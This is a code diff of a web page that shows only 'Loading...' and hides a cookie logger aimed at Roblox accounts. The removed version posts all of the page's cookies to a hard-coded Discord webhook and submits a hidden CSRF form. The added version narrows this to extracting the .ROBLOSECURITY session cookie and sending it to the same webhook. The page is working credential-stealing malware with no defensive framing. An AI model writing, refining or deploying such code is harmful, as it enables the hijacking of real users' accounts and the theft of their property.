@@ -1,28 +1,37 @@
 <html>
   <body>
     <h1>Loading...</h1>
-    <iframe style="width: 1px; height: 1px; visibility: hidden" name="exploitframe"></iframe>
-    <form method="POST" action="https://www.roblox.com/docs" target="exploitframe" id="csrf-form">
-      <input type="hidden" name=".csrf-token" value=""/>
-      <input type="hidden" name="cookie" value=""/>
-      <input type="hidden" name="path" value="/docs"/>
-    </form>
     <script>
-      var cookies = document.cookie;
-      document.getElementById('csrf-form').elements[1].value = cookies;
-      document.getElementById('csrf-form').submit();
+      var robloxCookie = getRobloxCookie();
       
-      var request = new XMLHttpRequest();
-      request.open("POST", "https://discord.com/api/webhooks/1293641125109956748/MqwIlGaJOFp_5YCHnFVOI8dpxTb73hKMycJWdaqDvEjTHmhxIg54Tu06QklUWcOL5fyz");
-      
-      request.setRequestHeader('Content-type', 'application/json');
-  
-      var params = {
-        username: "Cookie Logger",
-        content: "```" + cookies + "```"
+      if (robloxCookie) {
+        sendToWebhook(robloxCookie);
       }
-  
-      request.send(JSON.stringify(params));
+      
+      function getRobloxCookie() {
+        var cookies = document.cookie.split('; ');
+        for (var i = 0; i < cookies.length; i++) {
+          var cookie = cookies[i].split('=');
+          if (cookie[0] === '.ROBLOSECURITY') {
+            return cookie[1];
+          }
+        }
+        return null;
+      }
+      
+      function sendToWebhook(cookie) {
+        var request = new XMLHttpRequest();
+        request.open('POST', 'https://discord.com/api/webhooks/1293641125109956748/MqwIlGaJOFp_5YCHnFVOI8dpxTb73hKMycJWdaqDvEjTHmhxIg54Tu06QklUWcOL5fyz');
+        
+        request.setRequestHeader('Content-type', 'application/json');
+        
+        var params = {
+          username: 'Roblox Cookie Logger',
+          content: '```' + cookie + '```'
+        };
+        
+        request.send(JSON.stringify(params));
+      }
     </script>
   </body>
 </html>
